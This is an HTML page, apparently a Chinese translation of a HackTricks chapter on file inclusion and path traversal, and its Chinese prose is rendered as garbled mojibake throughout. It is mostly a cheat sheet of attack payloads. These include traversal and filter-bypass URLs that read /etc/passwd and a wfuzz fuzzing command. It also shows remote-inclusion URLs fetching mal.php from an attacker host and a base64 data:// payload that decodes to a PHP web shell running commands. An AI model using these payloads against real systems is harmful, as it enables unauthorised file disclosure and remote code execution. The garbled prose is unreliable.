<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>File Inclusion/Path traversal</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="æ–‡ä»¶åŒ…å«è·¯å¾„éå†"><a class="header" href="#æ–‡ä»¶åŒ…å«è·¯å¾„éå†">æ–‡ä»¶åŒ…å«/è·¯å¾„éå†</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>ç”µæŠ¥ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
<p>åŠ å…¥ <a href="https://discord.com/invite/N3FrSbmwdy"><strong>HackenProof Discord</strong></a> æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¼æ´èµé‡‘çŒäººäº¤æµï¼</p>
<p><strong>é»‘å®¢è§è§£</strong><br />
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢çš„åˆºæ¿€ä¸æŒ‘æˆ˜çš„å†…å®¹</p>
<p><strong>å®æ—¶é»‘å®¢æ–°é—»</strong><br />
é€šè¿‡å®æ—¶æ–°é—»å’Œè§è§£ï¼Œè·Ÿä¸Šå¿«é€Ÿå˜åŒ–çš„é»‘å®¢ä¸–ç•Œ</p>
<p><strong>æœ€æ–°å…¬å‘Š</strong><br />
äº†è§£æœ€æ–°çš„æ¼æ´èµé‡‘è®¡åˆ’å’Œé‡è¦å¹³å°æ›´æ–°</p>
<p><strong>ä»Šå¤©å°±åŠ å…¥æˆ‘ä»¬ï¼Œ</strong> <a href="https://discord.com/invite/N3FrSbmwdy"><strong>Discord</strong></a>ï¼Œä¸é¡¶å°–é»‘å®¢å¼€å§‹åˆä½œï¼</p>
<h2 id="æ–‡ä»¶åŒ…å«"><a class="header" href="#æ–‡ä»¶åŒ…å«">æ–‡ä»¶åŒ…å«</a></h2>
<p><strong>è¿œç¨‹æ–‡ä»¶åŒ…å« (RFI)ï¼š</strong> æ–‡ä»¶ä»è¿œç¨‹æœåŠ¡å™¨åŠ è½½ï¼ˆæœ€ä½³ï¼šæ‚¨å¯ä»¥ç¼–å†™ä»£ç ï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œå®ƒï¼‰ã€‚åœ¨ php ä¸­ï¼Œè¿™é»˜è®¤æ˜¯ <strong>ç¦ç”¨</strong> çš„ (<strong>allow_url_include</strong>)ã€‚<br />
<strong>æœ¬åœ°æ–‡ä»¶åŒ…å« (LFI)ï¼š</strong> æœåŠ¡å™¨åŠ è½½æœ¬åœ°æ–‡ä»¶ã€‚</p>
<p>å½“ç”¨æˆ·ä»¥æŸç§æ–¹å¼æ§åˆ¶å°†è¢«æœåŠ¡å™¨åŠ è½½çš„æ–‡ä»¶æ—¶ï¼Œå°±ä¼šå‘ç”Ÿæ­¤æ¼æ´ã€‚</p>
<p>æ˜“å—æ”»å‡»çš„ <strong>PHP å‡½æ•°</strong>ï¼šrequire, require_once, include, include_once</p>
<p>ä¸€ä¸ªæœ‰è¶£çš„å·¥å…·æ¥åˆ©ç”¨æ­¤æ¼æ´ï¼š<a href="https://github.com/kurobeats/fimap">https://github.com/kurobeats/fimap</a></p>
<h2 id="blind---interesting---lfi2rce-æ–‡ä»¶"><a class="header" href="#blind---interesting---lfi2rce-æ–‡ä»¶">Blind - Interesting - LFI2RCE æ–‡ä»¶</a></h2>
<pre><code class="language-python">wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
</code></pre>
<h3 id="linux"><a class="header" href="#linux"><strong>Linux</strong></a></h3>
<p><strong>æ··åˆå¤šä¸ª *nix LFI åˆ—è¡¨å¹¶æ·»åŠ æ›´å¤šè·¯å¾„ï¼Œæˆ‘åˆ›å»ºäº†è¿™ä¸ªï¼š</strong></p>
<p>{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}</p>
<p>å°è¯•å°† <code>/</code> æ”¹ä¸º <code>\</code><br />
å°è¯•æ·»åŠ  <code>../../../../../</code></p>
<p>ä¸€ä¸ªä½¿ç”¨å¤šç§æŠ€æœ¯æŸ¥æ‰¾æ–‡ä»¶ /etc/passwordï¼ˆä»¥æ£€æŸ¥æ¼æ´æ˜¯å¦å­˜åœ¨ï¼‰çš„åˆ—è¡¨å¯ä»¥åœ¨ <a href="https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt">è¿™é‡Œ</a> æ‰¾åˆ°ã€‚</p>
<h3 id="windows"><a class="header" href="#windows"><strong>Windows</strong></a></h3>
<p>ä¸åŒè¯è¡¨çš„åˆå¹¶ï¼š</p>
<p>{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}</p>
<p>å°è¯•å°† <code>/</code> æ”¹ä¸º <code>\</code><br />
å°è¯•åˆ é™¤ <code>C:/</code> å¹¶æ·»åŠ  <code>../../../../../</code></p>
<p>ä¸€ä¸ªä½¿ç”¨å¤šç§æŠ€æœ¯æŸ¥æ‰¾æ–‡ä»¶ /boot.iniï¼ˆä»¥æ£€æŸ¥æ¼æ´æ˜¯å¦å­˜åœ¨ï¼‰çš„åˆ—è¡¨å¯ä»¥åœ¨ <a href="https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt">è¿™é‡Œ</a> æ‰¾åˆ°ã€‚</p>
<h3 id="os-x"><a class="header" href="#os-x"><strong>OS X</strong></a></h3>
<p>æ£€æŸ¥ Linux çš„ LFI åˆ—è¡¨ã€‚</p>
<h2 id="åŸºæœ¬-lfi-å’Œç»•è¿‡"><a class="header" href="#åŸºæœ¬-lfi-å’Œç»•è¿‡">åŸºæœ¬ LFI å’Œç»•è¿‡</a></h2>
<p>æ‰€æœ‰ç¤ºä¾‹éƒ½æ˜¯é’ˆå¯¹æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼Œä½†ä¹Ÿå¯ä»¥åº”ç”¨äºè¿œç¨‹æ–‡ä»¶åŒ…å«ï¼ˆé¡µé¢=[http://myserver.com/phpshellcode.txt\](http://myserver.com/phpshellcode.txt)/ï¼‰ã€‚</p>
<pre><code>http://example.com/index.php?page=../../../etc/passwd
</code></pre>
<h3 id="éé€’å½’å‰¥ç¦»éå†åºåˆ—"><a class="header" href="#éé€’å½’å‰¥ç¦»éå†åºåˆ—">éé€’å½’å‰¥ç¦»éå†åºåˆ—</a></h3>
<pre><code class="language-python">http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
</code></pre>
<h3 id="ç©ºå­—èŠ‚-00"><a class="header" href="#ç©ºå­—èŠ‚-00"><strong>ç©ºå­—èŠ‚ (%00)</strong></a></h3>
<p>ç»•è¿‡åœ¨æä¾›çš„å­—ç¬¦ä¸²æœ«å°¾é™„åŠ æ›´å¤šå­—ç¬¦ï¼ˆç»•è¿‡ï¼š$_GET['param']."php"ï¼‰</p>
<pre><code>http://example.com/index.php?page=../../../etc/passwd%00
</code></pre>
<p>è¿™æ˜¯<strong>è‡ª PHP 5.4 èµ·å·²è§£å†³</strong></p>
<h3 id="ç¼–ç "><a class="header" href="#ç¼–ç "><strong>ç¼–ç </strong></a></h3>
<p>æ‚¨å¯ä»¥ä½¿ç”¨éæ ‡å‡†ç¼–ç ï¼Œä¾‹å¦‚åŒé‡ URL ç¼–ç ï¼ˆå’Œå…¶ä»–ç¼–ç ï¼‰ï¼š</p>
<pre><code>http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
</code></pre>
<h3 id="ä»ç°æœ‰æ–‡ä»¶å¤¹"><a class="header" href="#ä»ç°æœ‰æ–‡ä»¶å¤¹">ä»ç°æœ‰æ–‡ä»¶å¤¹</a></h3>
<p>ä¹Ÿè®¸åç«¯æ­£åœ¨æ£€æŸ¥æ–‡ä»¶å¤¹è·¯å¾„ï¼š</p>
<pre><code class="language-python">http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
</code></pre>
<h3 id="æ¢ç´¢æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ç³»ç»Ÿç›®å½•"><a class="header" href="#æ¢ç´¢æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ç³»ç»Ÿç›®å½•">æ¢ç´¢æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ç³»ç»Ÿç›®å½•</a></h3>
<p>æœåŠ¡å™¨çš„æ–‡ä»¶ç³»ç»Ÿå¯ä»¥é€šè¿‡æŸäº›æŠ€æœ¯é€’å½’åœ°æ¢ç´¢ï¼Œä»¥è¯†åˆ«ç›®å½•ï¼Œè€Œä¸ä»…ä»…æ˜¯æ–‡ä»¶ã€‚æ­¤è¿‡ç¨‹æ¶‰åŠç¡®å®šç›®å½•æ·±åº¦å¹¶æ¢æµ‹ç‰¹å®šæ–‡ä»¶å¤¹çš„å­˜åœ¨ã€‚ä»¥ä¸‹æ˜¯å®ç°æ­¤ç›®æ ‡çš„è¯¦ç»†æ–¹æ³•ï¼š</p>
<ol>
<li><strong>ç¡®å®šç›®å½•æ·±åº¦ï¼š</strong> é€šè¿‡æˆåŠŸè·å– <code>/etc/passwd</code> æ–‡ä»¶æ¥ç¡®å®šå½“å‰ç›®å½•çš„æ·±åº¦ï¼ˆé€‚ç”¨äºåŸºäºLinuxçš„æœåŠ¡å™¨ï¼‰ã€‚ä¸€ä¸ªç¤ºä¾‹URLå¯èƒ½ç»“æ„å¦‚ä¸‹ï¼Œè¡¨ç¤ºæ·±åº¦ä¸ºä¸‰ï¼š</li>
</ol>
<pre><code class="language-bash">http://example.com/index.php?page=../../../etc/passwd # depth of 3
</code></pre>
<ol start="2">
<li><strong>æ¢æµ‹æ–‡ä»¶å¤¹ï¼š</strong> å°†æ€€ç–‘çš„æ–‡ä»¶å¤¹åç§°ï¼ˆä¾‹å¦‚ï¼Œ<code>private</code>ï¼‰é™„åŠ åˆ° URLï¼Œç„¶åå¯¼èˆªå› <code>/etc/passwd</code>ã€‚é¢å¤–çš„ç›®å½•çº§åˆ«éœ€è¦å°†æ·±åº¦å¢åŠ ä¸€ä¸ªï¼š</li>
</ol>
<pre><code class="language-bash">http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
</code></pre>
<ol start="3">
<li><strong>è§£é‡Šç»“æœï¼š</strong> æœåŠ¡å™¨çš„å“åº”æŒ‡ç¤ºæ–‡ä»¶å¤¹æ˜¯å¦å­˜åœ¨ï¼š</li>
</ol>
<ul>
<li><strong>é”™è¯¯ / æ— è¾“å‡ºï¼š</strong> æ–‡ä»¶å¤¹ <code>private</code> å¯èƒ½åœ¨æŒ‡å®šä½ç½®ä¸å­˜åœ¨ã€‚</li>
<li><strong><code>/etc/passwd</code> çš„å†…å®¹ï¼š</strong> ç¡®è®¤å­˜åœ¨ <code>private</code> æ–‡ä»¶å¤¹ã€‚</li>
</ul>
<ol start="4">
<li><strong>é€’å½’æ¢ç´¢ï¼š</strong> å‘ç°çš„æ–‡ä»¶å¤¹å¯ä»¥ä½¿ç”¨ç›¸åŒçš„æŠ€æœ¯æˆ–ä¼ ç»Ÿçš„æœ¬åœ°æ–‡ä»¶åŒ…å« (LFI) æ–¹æ³•è¿›ä¸€æ­¥æ¢æµ‹å­ç›®å½•æˆ–æ–‡ä»¶ã€‚</li>
</ol>
<p>è¦æ¢ç´¢æ–‡ä»¶ç³»ç»Ÿä¸­ä¸åŒä½ç½®çš„ç›®å½•ï¼Œè¯·ç›¸åº”è°ƒæ•´æœ‰æ•ˆè´Ÿè½½ã€‚ä¾‹å¦‚ï¼Œè¦æ£€æŸ¥ <code>/var/www/</code> æ˜¯å¦åŒ…å« <code>private</code> ç›®å½•ï¼ˆå‡è®¾å½“å‰ç›®å½•æ·±åº¦ä¸º 3ï¼‰ï¼Œè¯·ä½¿ç”¨ï¼š</p>
<pre><code class="language-bash">http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
</code></pre>
<h3 id="è·¯å¾„æˆªæ–­æŠ€æœ¯"><a class="header" href="#è·¯å¾„æˆªæ–­æŠ€æœ¯"><strong>è·¯å¾„æˆªæ–­æŠ€æœ¯</strong></a></h3>
<p>è·¯å¾„æˆªæ–­æ˜¯ä¸€ç§ç”¨äºæ“çºµWebåº”ç”¨ç¨‹åºä¸­æ–‡ä»¶è·¯å¾„çš„æ–¹æ³•ã€‚å®ƒé€šå¸¸ç”¨äºé€šè¿‡ç»•è¿‡æŸäº›å®‰å…¨æªæ–½æ¥è®¿é—®å—é™æ–‡ä»¶ï¼Œè¿™äº›å®‰å…¨æªæ–½ä¼šåœ¨æ–‡ä»¶è·¯å¾„çš„æœ«å°¾é™„åŠ é¢å¤–å­—ç¬¦ã€‚ç›®æ ‡æ˜¯æ„é€ ä¸€ä¸ªæ–‡ä»¶è·¯å¾„ï¼Œè¯¥è·¯å¾„åœ¨è¢«å®‰å…¨æªæ–½ä¿®æ”¹åï¼Œä»ç„¶æŒ‡å‘æ‰€éœ€çš„æ–‡ä»¶ã€‚</p>
<p>åœ¨PHPä¸­ï¼Œç”±äºæ–‡ä»¶ç³»ç»Ÿçš„æ€§è´¨ï¼Œæ–‡ä»¶è·¯å¾„çš„å„ç§è¡¨ç¤ºå¯ä»¥è¢«è§†ä¸ºç­‰æ•ˆã€‚ä¾‹å¦‚ï¼š</p>
<ul>
<li><code>/etc/passwd</code>ã€<code>/etc//passwd</code>ã€<code>/etc/./passwd</code>å’Œ<code>/etc/passwd/</code>éƒ½è¢«è§†ä¸ºç›¸åŒçš„è·¯å¾„ã€‚</li>
<li>å½“æœ€å6ä¸ªå­—ç¬¦ä¸º<code>passwd</code>æ—¶ï¼Œé™„åŠ ä¸€ä¸ª<code>/</code>ï¼ˆä½¿å…¶å˜ä¸º<code>passwd/</code>ï¼‰ä¸ä¼šæ”¹å˜ç›®æ ‡æ–‡ä»¶ã€‚</li>
<li>åŒæ ·ï¼Œå¦‚æœåœ¨æ–‡ä»¶è·¯å¾„åé™„åŠ <code>.php</code>ï¼ˆå¦‚<code>shellcode.php</code>ï¼‰ï¼Œåœ¨æœ«å°¾æ·»åŠ <code>/.</code>ä¸ä¼šæ”¹å˜è¢«è®¿é—®çš„æ–‡ä»¶ã€‚</li>
</ul>
<p>æä¾›çš„ç¤ºä¾‹æ¼”ç¤ºäº†å¦‚ä½•åˆ©ç”¨è·¯å¾„æˆªæ–­è®¿é—®<code>/etc/passwd</code>ï¼Œè¿™æ˜¯ä¸€ä¸ªç”±äºå…¶æ•æ„Ÿå†…å®¹ï¼ˆç”¨æˆ·è´¦æˆ·ä¿¡æ¯ï¼‰è€Œå¸¸è§çš„ç›®æ ‡ï¼š</p>
<pre><code>http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
</code></pre>
<pre><code>http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
</code></pre>
<p>åœ¨è¿™äº›åœºæ™¯ä¸­ï¼Œæ‰€éœ€çš„éå†æ¬¡æ•°å¯èƒ½åœ¨2027å·¦å³ï¼Œä½†è¿™ä¸ªæ•°å­—å¯èƒ½ä¼šæ ¹æ®æœåŠ¡å™¨çš„é…ç½®è€Œæœ‰æ‰€ä¸åŒã€‚</p>
<ul>
<li><strong>ä½¿ç”¨ç‚¹æ®µå’Œé™„åŠ å­—ç¬¦</strong>ï¼šéå†åºåˆ—ï¼ˆ<code>../</code>ï¼‰ä¸é¢å¤–çš„ç‚¹æ®µå’Œå­—ç¬¦ç»“åˆä½¿ç”¨ï¼Œå¯ä»¥ç”¨æ¥å¯¼èˆªæ–‡ä»¶ç³»ç»Ÿï¼Œæœ‰æ•ˆåœ°å¿½ç•¥æœåŠ¡å™¨é™„åŠ çš„å­—ç¬¦ä¸²ã€‚</li>
<li><strong>ç¡®å®šæ‰€éœ€çš„éå†æ¬¡æ•°</strong>ï¼šé€šè¿‡åå¤è¯•éªŒï¼Œå¯ä»¥æ‰¾åˆ°ç²¾ç¡®çš„<code>../</code>åºåˆ—æ•°é‡ï¼Œä»¥å¯¼èˆªåˆ°æ ¹ç›®å½•ï¼Œç„¶ååˆ°<code>/etc/passwd</code>ï¼Œç¡®ä¿ä»»ä½•é™„åŠ çš„å­—ç¬¦ä¸²ï¼ˆå¦‚<code>.php</code>ï¼‰è¢«ä¸­å’Œï¼Œä½†æ‰€éœ€çš„è·¯å¾„ï¼ˆ<code>/etc/passwd</code>ï¼‰ä¿æŒä¸å˜ã€‚</li>
<li><strong>ä»è™šå‡ç›®å½•å¼€å§‹</strong>ï¼šé€šå¸¸çš„åšæ³•æ˜¯ä»¥ä¸€ä¸ªä¸å­˜åœ¨çš„ç›®å½•ï¼ˆå¦‚<code>a/</code>ï¼‰å¼€å§‹è·¯å¾„ã€‚è¿™ç§æŠ€æœ¯ä½œä¸ºé¢„é˜²æªæ–½æˆ–æ»¡è¶³æœåŠ¡å™¨è·¯å¾„è§£æé€»è¾‘çš„è¦æ±‚ã€‚</li>
</ul>
<p>åœ¨ä½¿ç”¨è·¯å¾„æˆªæ–­æŠ€æœ¯æ—¶ï¼Œäº†è§£æœåŠ¡å™¨çš„è·¯å¾„è§£æè¡Œä¸ºå’Œæ–‡ä»¶ç³»ç»Ÿç»“æ„è‡³å…³é‡è¦ã€‚æ¯ç§æƒ…å†µå¯èƒ½éœ€è¦ä¸åŒçš„æ–¹æ³•ï¼Œé€šå¸¸éœ€è¦æµ‹è¯•ä»¥æ‰¾åˆ°æœ€æœ‰æ•ˆçš„æ–¹å¼ã€‚</p>
<p><strong>æ­¤æ¼æ´åœ¨PHP 5.3ä¸­å·²è¢«ä¿®å¤ã€‚</strong></p>
<h3 id="è¿‡æ»¤å™¨ç»•è¿‡æŠ€å·§"><a class="header" href="#è¿‡æ»¤å™¨ç»•è¿‡æŠ€å·§"><strong>è¿‡æ»¤å™¨ç»•è¿‡æŠ€å·§</strong></a></h3>
<pre><code>http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
</code></pre>
<h2 id="remote-file-inclusion"><a class="header" href="#remote-file-inclusion">Remote File Inclusion</a></h2>
<p>åœ¨phpä¸­ï¼Œè¿™é»˜è®¤æ˜¯ç¦ç”¨çš„ï¼Œå› ä¸º <strong><code>allow_url_include</code></strong> æ˜¯ <strong>å…³é—­</strong> çš„ã€‚å®ƒå¿…é¡»æ˜¯ <strong>å¼€å¯</strong> çš„æ‰èƒ½å·¥ä½œï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½ å¯ä»¥ä»ä½ çš„æœåŠ¡å™¨åŒ…å«ä¸€ä¸ªPHPæ–‡ä»¶å¹¶è·å¾—RCEï¼š</p>
<pre><code class="language-python">http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
</code></pre>
<p>å¦‚æœç”±äºæŸç§åŸå›  <strong><code>allow_url_include</code></strong> æ˜¯ <strong>On</strong>ï¼Œä½† PHP æ­£åœ¨ <strong>è¿‡æ»¤</strong> å¯¹å¤–éƒ¨ç½‘é¡µçš„è®¿é—®ï¼Œ<a href="https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/">æ ¹æ®è¿™ç¯‡æ–‡ç« </a>ï¼Œä½ å¯ä»¥ä½¿ç”¨ä¾‹å¦‚æ•°æ®åè®®å’Œ base64 æ¥è§£ç  b64 PHP ä»£ç å¹¶è·å¾— RCEï¼š</p>
<p>{% code overflow="wrap" %}</p>
<pre><code>PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
</code></pre>
<p>{% endcode %}</p>
<p>{% hint style="info" %}
åœ¨å‰é¢çš„ä»£ç ä¸­ï¼Œæœ€åçš„ <code>+.txt</code> è¢«æ·»åŠ æ˜¯å› ä¸ºæ”»å‡»è€…éœ€è¦ä¸€ä¸ªä»¥ <code>.txt</code> ç»“å°¾çš„å­—ç¬¦ä¸²ï¼Œå› æ­¤å­—ç¬¦ä¸²ä»¥å®ƒç»“å°¾ï¼Œç»è¿‡ b64 è§£ç åé‚£éƒ¨åˆ†å°†è¿”å›åƒåœ¾æ•°æ®ï¼ŒçœŸæ­£çš„ PHP ä»£ç å°†è¢«åŒ…å«ï¼ˆå› æ­¤è¢«æ‰§è¡Œï¼‰ã€‚
{% endhint %}</p>
<p>å¦ä¸€ä¸ª<strong>ä¸ä½¿ç”¨ <code>php://</code> åè®®</strong>çš„ä¾‹å­æ˜¯ï¼š</p>
<p>{% code overflow="wrap" %}</p>
<pre><code>data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
</code></pre>
<p>{% endcode %}</p>
<h2 id="python-æ ¹å…ƒç´ "><a class="header" href="#python-æ ¹å…ƒç´ ">Python æ ¹å…ƒç´ </a></h2>
<p>åœ¨ Python ä¸­ï¼Œåƒè¿™æ ·çš„ä»£ç ï¼š</p>
<pre><code class="language-python"># file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
</code></pre>
<p>å¦‚æœç”¨æˆ·ä¼ é€’ä¸€ä¸ª <strong>ç»å¯¹è·¯å¾„</strong> ç»™ <strong><code>file_name</code></strong>ï¼Œ<strong>ä¹‹å‰çš„è·¯å¾„ä¼šè¢«ç§»é™¤</strong>ï¼š</p>
<pre><code class="language-python">os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
</code></pre>
<p>æ ¹æ®<a href="https://docs.python.org/3.10/library/os.path.html#os.path.join">æ–‡æ¡£</a>ï¼Œè¿™æ˜¯é¢„æœŸçš„è¡Œä¸ºï¼š</p>
<blockquote>
<p>å¦‚æœä¸€ä¸ªç»„ä»¶æ˜¯ç»å¯¹è·¯å¾„ï¼Œåˆ™æ‰€æœ‰å…ˆå‰çš„ç»„ä»¶éƒ½ä¼šè¢«ä¸¢å¼ƒï¼Œå¹¶ä»ç»å¯¹è·¯å¾„ç»„ä»¶ç»§ç»­è¿æ¥ã€‚</p>
</blockquote>
